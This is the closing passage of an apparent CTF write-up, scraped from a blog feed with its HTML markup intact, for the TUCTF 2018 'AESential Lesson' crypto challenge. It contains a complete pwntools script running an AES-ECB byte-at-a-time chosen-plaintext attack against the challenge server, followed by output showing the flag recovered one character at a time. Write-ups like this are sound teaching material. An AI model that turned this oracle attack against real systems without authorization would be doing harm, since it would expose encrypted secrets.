class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">r = remote(<span class="string">'18.218.238.95'</span>, <span class="number">12345</span>)</span><br><span class="line"><span class="comment">#r = process('./redacted.py')</span></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Enter your text here: '</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">''</span>:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">15</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">15</span>-i) + flag+c)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[:<span class="number">32</span>]:</span><br><span class="line">flag += c</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">15</span>-i<span class="number">-1</span>))</span><br><span class="line">encrypted_first = re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">padding_char = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> padding_char == <span class="string">''</span>:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">1</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.printable:</span><br><span class="line">p = <span class="string">'&#125;'</span>+ x*<span class="number">15</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[<span class="number">64</span>:<span class="number">64</span>+<span class="number">32</span>]:</span><br><span class="line">padding_char = x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'&#125;'</span>*<span class="number">1</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag_part2 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">p = c+flag_part2 + (i<span class="number">-1</span>)*padding_char</span><br><span class="line">r.sendline(p)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[<span class="number">64</span>:<span class="number">64</span>+<span class="number">32</span>]:</span><br><span class="line">flag_part2 = c + flag_part2</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">17</span>-i+<span class="number">1</span>))</span><br><span class="line">encrypted_first = re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> flag+flag_part2</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">python reeas.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./redacted.py'</span>: pid 11451</span><br><span class="line">Enter your text here: </span><br><span class="line">TUCTF&#123;A3S_3CB_1S&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SBL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SR4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SLN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SULN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SVULN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S_VULN3R4BL3!!!!&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;AESential Lesson&lt;br&gt;465&lt;br&gt;&lt;br&gt;Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.&lt;
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
    
      <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
    
      <category term="tuctf2018" scheme="https://teamrocketist.github.io/tags/tuctf2018/"/>
    
  </entry>
  
</feed>
